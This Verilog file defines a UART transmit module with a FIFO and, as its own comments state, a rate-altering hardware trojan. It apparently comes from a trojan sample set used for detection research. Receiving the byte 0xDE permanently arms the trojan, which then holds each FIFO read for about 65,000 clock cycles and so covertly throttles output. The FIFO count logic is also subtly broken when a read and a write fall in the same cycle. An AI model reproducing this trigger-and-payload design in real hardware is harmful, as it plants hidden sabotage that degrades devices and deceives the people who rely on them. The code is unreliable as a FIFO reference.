 // Modified UART TX Module with FIFO and a Rate-Altering Hardware Trojan
module uart_tx_fifo_trojan_v4 (
    input clk,
    input rx_we,
    input [7:0] rx_data,
    output reg tx_busy = 1'b0,
    output tx_serial
);

    reg [7:0] mem [0:31]; // FIFO memory
    reg [4:0] w_addr = 5'd0, r_addr = 5'd0; // Write and read pointers
    reg [4:0] cnt = 5'd0; // Count of bytes in FIFO
    reg we = 1'b0; // Write enable for internal UART TX
    reg [7:0] data = 8'd0; // Data to be sent

    wire uart_busy;
    uart_tx uart (
        .clk(clk),
        .rx_we(we),
        .rx_data(data),
        .tx_busy(uart_busy),
        .tx_serial(tx_serial)
    );

    // Trojan activity flags and counters
    reg [15:0] trojan_counter = 16'd0; // Counter to delay UART transmission intermittently
    reg trojan_activated = 1'b0; // Flag indicating whether the trojan has been activated

    // Trojan activation condition based on a unique pattern of data
    always @(posedge clk) begin
        if (rx_we && rx_data == 8'hDE) begin // Specific trigger condition
            trojan_activated <= 1'b1;
        end
    end

    // Trojan behavior: alters transmission rate by intermittently delaying the read process
    always @(posedge clk) begin
        // Data writing process
        if (rx_we && (cnt < 5'd31)) begin
            mem[w_addr] <= rx_data;
            w_addr <= w_addr + 5'd1;
            cnt <= cnt + 5'd1;
        end

        // Data reading and transmission process
        if (~uart_busy && (cnt > 5'd0) && ~we) begin
            if (trojan_activated && (trojan_counter < 16'hFF00)) begin // Slow down transmission
                trojan_counter <= trojan_counter + 1;
            end else begin
                trojan_counter <= 16'd0; // Reset counter
                data <= mem[r_addr]; // Set data for transmission
                r_addr <= r_addr + 5'd1;
                cnt <= cnt - 5'd1;
                we <= 1'b1; // Trigger data transmission
            end
        end else begin
            we <= 1'b0; // Reset write enable
        end

        // Updating the busy signal
        tx_busy <= uart_busy || (cnt != 5'd0);
    end

endmodule
